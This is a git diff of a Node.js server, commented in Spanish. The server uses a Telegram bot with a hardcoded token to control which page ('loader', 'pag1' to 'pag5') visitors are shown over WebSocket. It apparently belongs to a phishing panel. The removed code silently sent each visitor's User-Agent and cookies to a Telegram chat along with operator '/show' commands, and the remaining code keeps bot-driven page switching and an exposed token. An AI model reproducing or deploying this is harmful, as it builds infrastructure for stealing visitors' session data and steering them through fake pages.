@@ -26,58 +26,33 @@ db.prepare("INSERT OR IGNORE INTO control (id, pagina) VALUES (1, 'loader')").ru
 
 // 🔐 Credenciales de Telegram
 const TELEGRAM_BOTS = [
-    {
-        token: "7669760908:AAFpRpQVlvJbSmignQoO1SwPuyoxsHL_i2c",
-        chatId: "6328222257"
-    }
+    { token: "7669760908:AAFpRpQVlvJbSmignQoO1SwPuyoxsHL_i2c", chatId: "TU_CHAT_ID" }
 ];
 
-// 📩 Función para notificar a Telegram
-function sendTelegramMessage(userAgent, cookies) {
-    console.log("🔍 Enviando mensaje a Telegram...");
-    console.log("📌 User-Agent:", userAgent);
-    console.log("🍪 Cookies:", cookies);
-
-    const message = `👀 *Nuevo visitante en la página*  
-📌 *User-Agent:* ${userAgent}  
-🍪 *Cookies:* ${JSON.stringify(cookies)}  
-
-📝 *Opciones:*  
-➡️ /show pag1  
-➡️ /show pag2  
-➡️ /show pag3  
-➡️ /show pag4  
-➡️ /show pag5`;
-
-    TELEGRAM_BOTS.forEach(bot => {
-        axios.post(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
-            chat_id: bot.chatId,
-            text: message,
-            parse_mode: "MarkdownV2",
-        }).then(() => {
-            console.log(`✅ Mensaje enviado a Telegram - Bot: ${bot.token}`);
-        }).catch(error => {
-            console.error(`❌ Error enviando mensaje al bot ${bot.token}:`, 
-                error.response ? error.response.data : error.message
-            );
-        });
-    });
+// 📩 Función para enviar mensajes a Telegram
+async function sendTelegramMessage(message) {
+    try {
+        for (const bot of TELEGRAM_BOTS) {
+            await axios.post(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
+                chat_id: bot.chatId,
+                text: message,
+                parse_mode: "MarkdownV2"
+            });
+        }
+        console.log("✅ Mensaje enviado a Telegram");
+    } catch (error) {
+        console.error("❌ Error enviando mensaje a Telegram:", error.message);
+    }
 }
 
-// 📌 Endpoint para verificar el estado de la página (corrige que no siempre devuelva "loader")
+// 📌 Endpoint para verificar el estado de la página
 app.get("/check", (req, res) => {
     const row = db.prepare("SELECT pagina FROM control WHERE id = 1").get();
-    const pagina = row ? row.pagina : "loader";
-    res.json({ pagina });
+    res.json({ pagina: row ? row.pagina : "loader" });
 });
 
-// 🏠 Ruta principal (evita redirecciones inesperadas)
-app.get("/index.html", (req, res) => {
-    const userAgent = req.headers["user-agent"];
-    const cookies = req.cookies;
-    console.log("📢 Nuevo visitante detectado:", { userAgent, cookies });
-
-    sendTelegramMessage(userAgent, cookies);
+// 🏠 Ruta principal
+app.get("/", (req, res) => {
     res.sendFile(path.join(__dirname, "public", "index.html"));
 });
 
@@ -87,16 +62,17 @@ wss.on("connection", (ws) => {
 
     // 🔥 Ahora obtiene el estado real desde la base de datos
     const row = db.prepare("SELECT pagina FROM control WHERE id = 1").get();
-    const pagina = row ? row.pagina : "loader";
+    const paginaActual = row ? row.pagina : "loader";
 
-    ws.send(pagina);
+    console.log(`📌 Página actual enviada al cliente: ${paginaActual}`);
+    ws.send(paginaActual); // Enviar la página real al cliente
 
     ws.on("close", () => {
         console.log("🔌 Cliente WebSocket desconectado");
     });
 });
 
-// ⚡ Endpoint para cambiar la página que se mostrará
+// ⚡ Endpoint para cambiar la página (usado por el bot)
 app.post("/setPage", (req, res) => {
     const { pagina } = req.body;
 
@@ -104,10 +80,10 @@ app.post("/setPage", (req, res) => {
         return res.status(400).json({ error: "Falta el parámetro 'pagina'" });
     }
 
-    db.prepare("UPDATE control SET pagina = ? WHERE id = 1").run(pagina);
+    db.prepare("INSERT OR REPLACE INTO control (id, pagina) VALUES (1, ?)").run(pagina);
     console.log(`✅ Página cambiada a: ${pagina}`);
 
-    // 🔥 Notificar a todos los clientes WebSocket
+    // Notificar a todos los clientes WebSocket
     wss.clients.forEach((client) => {
         if (client.readyState === WebSocket.OPEN) {
             client.send(pagina);
@@ -117,36 +93,6 @@ app.post("/setPage", (req, res) => {
     res.json({ message: "Página actualizada" });
 });
 
-// 📩 Endpoint para enviar mensajes a Telegram desde el frontend
-app.post('/enviar-telegram', async (req, res) => {
-    try {
-        const { token, chatId, mensaje } = req.body;
-
-        if (!token || !chatId || !mensaje) {
-            return res.status(400).json({ error: "Faltan datos requeridos (token, chatId o mensaje)" });
-        }
-
-        const response = await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
-            chat_id: chatId,
-            text: mensaje,
-            parse_mode: "MarkdownV2"
-        });
-
-        console.log(`✅ Mensaje enviado exitosamente al bot: ${token}`);
-        res.json({ success: true, message: "Mensaje enviado correctamente a Telegram" });
-
-    } catch (error) {
-        console.error(`❌ Error al enviar mensaje al bot ${req.body.token}:`, 
-            error.response ? error.response.data : error.message
-        );
-
-        res.status(500).json({ 
-            error: "Error al enviar mensaje a Telegram",
-            details: error.response ? error.response.data : error.message
-        });
-    }
-});
-
-// 🚀 Iniciar servidor en Render
-const PORT = 3000;
+// 🚀 Iniciar servidor
+const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => console.log(`🌍 Servidor corriendo en http://0.0.0.0:${PORT}`));
